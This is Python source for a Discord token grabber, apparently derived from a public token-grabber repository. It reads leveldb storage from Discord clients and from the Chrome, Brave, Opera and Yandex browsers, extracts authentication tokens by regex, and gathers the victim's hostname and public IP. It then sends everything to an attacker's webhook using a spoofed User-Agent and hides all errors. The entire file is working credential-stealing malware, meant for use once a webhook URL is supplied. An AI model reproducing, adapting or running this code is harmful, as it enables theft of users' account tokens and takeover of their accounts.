# -*- coding: utf-8 -*-
'''Based on https://github.com/wodxgod/Discord-Token-Grabber/blob/master/token-grabber.py
Not obfuscated because that would fuck up stuff when editing the WEBHOOK_URL
'''
import json
import os
import re
from contextlib import suppress
from pathlib import Path, PurePath
from socket import gethostname
from urllib.request import Request, urlopen

WEBHOOK_URL = ''
TOKEN_REGEX = re.compile(r"[\w\-]{24}\.[\w\-]{6}\.[\w\-]{27}|mfa\.[\w\-_]{84}")
LOGO = 'https://geazersb.github.io/logo.gif'

def find_tokens(path: Path) -> list:
    path = PurePath(path, 'Local Storage', 'leveldb')
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(('.log', '.ldb')):
            continue

        with open(Path(f'{path}/{file_name}'), errors='ignore', encoding='utf-8') as file:
            for line in [l.strip() for l in file.readlines() if l.strip()]:
                tokens.extend(re.findall(TOKEN_REGEX, line))

    return tokens

def main():
    with suppress(Exception):
        ip = (json.load(urlopen('https://api.ipify.org/?format=json'))).get('ip', 'Invalid')
        hostname = gethostname()
        local, roaming = os.getenv('LOCALAPPDATA'), os.getenv('APPDATA')
        paths = {
            'Discord': Path(f'{roaming}/Discord'),
            'Discord Canary': Path(f'{roaming}/discordcanary'),
            'Discord PTB': Path(f'{roaming}/discordptb'),
            'Opera': Path(f'{roaming}/Opera Software/Opera Stable'),
            'Google Chrome': Path(f'{local}/Google/Chrome/User Data/Default'),
            'Brave': Path(f'{local}/BraveSoftware/Brave-Browser/User Data/Default'),
            'Yandex': Path(f'{local}/Yandex/YandexBrowser/User Data/Default')
        }
        tokens_found = 0
        formatted = [f'**Hostname:** {hostname}\n**IP:** {ip}']

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            tokens = find_tokens(path)
            tokens_found += len(tokens)
            formatted.append(f'**{platform}**\n' + ('\n'.join([f'{i}. {t}' for i, t in enumerate(tokens, 1)]) or 'No Tokens Found'))

        payload = bytes(
            json.dumps({
                'username': 'Token Logger',
                'avatar_url': LOGO,
                'embeds': [{
                    'title': f'{tokens_found} tokens found',
                    'description': '\n\n'.join(formatted),
                    'color': 15277667,
                    'footer': {
                        'icon_url': LOGO,
                        'text': 'Geazer Selfbot'
                    }
                }]
            }),
            encoding='utf-8'
        )
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
        }

        urlopen(Request(
            WEBHOOK_URL,
            data=payload,
            headers=headers
        ))


if __name__ == '__main__':
    main()
